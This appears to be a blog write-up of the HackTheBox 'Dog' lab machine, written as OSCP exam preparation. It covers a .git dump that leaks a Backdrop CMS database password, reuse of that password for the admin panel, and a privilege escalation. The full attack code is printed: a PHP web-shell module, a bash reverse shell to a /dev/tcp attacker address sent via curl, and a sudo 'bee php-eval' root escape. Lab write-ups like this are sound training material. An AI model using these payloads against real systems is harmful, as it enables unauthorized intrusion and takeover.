+++
date = '2026-05-16T00:00:00-03:00'
draft = false
title = 'HTB: Dog - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'web', 'git', 'gitdumper', 'backdrop-cms', 'credential-reuse', 'module-upload', 'rce', 'bee', 'gtfobins']
description = 'Write-up for HackTheBox Dog - an exposed .git directory leaks Backdrop CMS database credentials, which double as admin credentials for panel access, enabling module-upload RCE and a clean root escalation via the bee CLI tool.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-dog/cover.png'
+++

Sometimes nmap does half the work for you. `.git` on port 80 is all the hint you need.

## Machine info

| | |
|---|---|
| **Name** | Dog |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- Nmap's `http-git` script flags an exposed `.git` directory; a browser extension confirms it
- `gitdumper.py` reconstructs the repository and surfaces the Backdrop CMS settings file with database credentials: `root:BackDropJ2024DS2024`
- The git history reveals an admin email; the DB password also works as the admin panel password
- Backdrop admin access allows installing a malicious module - shell as `www-data`
- `sudo -l` shows `bee` (Backdrop's CLI) without a password; `bee php-eval` with `sudo` gives root

---

## Recon

### Nmap

![Nmap results](/images/htb-dog/nmap.png)

```bash
nmap -sV -sC -Pn -A 10.129.231.223
```

Ports 22 (SSH) and 80 (HTTP, Apache 2.4.41 Ubuntu). The nmap output has two things worth flagging immediately: the `http-title` is "Home | Dog", and the `http-git` NSE script reports a Git repository at `/.git/` with a remote pointing to `https://gitea.dog.htb/BackDropDevs/dog_development`. The robots.txt entries are all Backdrop CMS paths. Framework and source exposure confirmed in one scan.

---

## Enumeration

### Exposed .git

The `.GIT` browser extension catches it too:

![.git exposed in browser](/images/htb-dog/git-exposed-browser.png)

A publicly accessible `.git` directory means the entire source history is downloadable - including any config files, credentials, or secrets that were ever committed.

### Dumping the repository

```bash
gitdumper.py http://10.129.231.223/.git ./git
```

![gitdumper running](/images/htb-dog/gitdumper.png)

`gitdumper.py` reconstructs the repository from the exposed object store. Once done, `git checkout -- .` restores the working tree.

### Credentials in settings.php

Digging through the dumped files, the Backdrop CMS settings file contains the database connection string:

```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

Database user `root`, password `BackDropJ2024DS2024`. Backdrop also ships helper scripts under `core/scripts/` - including `password-hash.sh` - which become useful if credential reuse doesn't pan out.

### Admin email from git history

```bash
git log --all --oneline
git show <commit>
```

Reviewing the commit history surfaces the admin user's email address. Added `dog.htb` to `/etc/hosts` and tried logging into the Backdrop admin panel at `/user/login`.

---

## Foothold

### Backdrop admin access

The database password `BackDropJ2024DS2024` works as the admin panel password. Credential reuse between the database and the web application is the single biggest bang-for-buck check after you find any plaintext credential.

### Module upload RCE

Backdrop CMS allows admins to install modules by uploading a `.zip` archive. This is a direct code execution path. Create a minimal malicious module with a PHP backdoor:

```bash
# Structure: dog_shell/dog_shell.info + dog_shell/dog_shell.module
mkdir dog_shell
cat > dog_shell/dog_shell.info << 'EOF'
name = Dog Shell
description = shell
package = Other
version = 1.0
type = module
backdrop = 1.x
EOF

cat > dog_shell/dog_shell.module << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

zip -r dog_shell.zip dog_shell/
```

Upload via **Functionality > Install New Modules**, then trigger execution:

```bash
curl "http://dog.htb/modules/dog_shell/dog_shell.module?cmd=id"
# uid=33(www-data)
```

RCE confirmed. Set up a netcat listener and send a reverse shell:

```bash
curl "http://dog.htb/modules/dog_shell/dog_shell.module?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.X/4444+0>%261'"
```

Shell as `www-data@dog`.

### Lateral move to user

```bash
su johncusack
# Password: BackDropJ2024DS2024
```

The database password works here too. User flag captured.

---

## Privilege Escalation

### sudo -l

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/local/bin/bee
```

`bee` is Backdrop's drush-equivalent CLI tool. Running it without a password as any user means we can use it to execute arbitrary PHP as root.

### bee php-eval shell escape

```bash
sudo bee --root=/var/www/html php-eval 'system("/bin/bash -i");'
```

`bee` accepts a `--root` path pointing to a Backdrop installation and executes PHP in that context. Since `sudo` runs the process as root, `system()` spawns root's shell.

**Root.**

---

## Takeaways

- **An exposed `.git` on a web server is critical severity.** The entire source history, including credentials and internal configs, is reconstructable by anyone with a gitdumper script. This is a one-command compromise.
- **Database credentials get reused everywhere.** The same password unlocked the DB connection string, the admin panel, and a system user account. Every credential you find is worth trying against every login surface.
- **Backdrop module upload is the same class of bug as Joomla template edit or WordPress plugin install.** Any CMS admin panel that can deploy code is an RCE primitive. Enumerate CMS admin access aggressively.
- **`sudo` on a CLI tool with eval/exec capabilities is an instant root.** `bee`, `drush`, `wp-cli`, and similar tools all have PHP eval or shell-command features. If any of them appear in `sudo -l`, it's game over.

## References

- [HackTheBox - Dog](https://app.hackthebox.com/machines/Dog)
- [GitDumper - git-dumper](https://github.com/arthaud/git-dumper)
- [GTFOBins - bee](https://gtfobins.github.io/gtfobins/bee/)
- Lain Kusanagi list (OSCP prep)
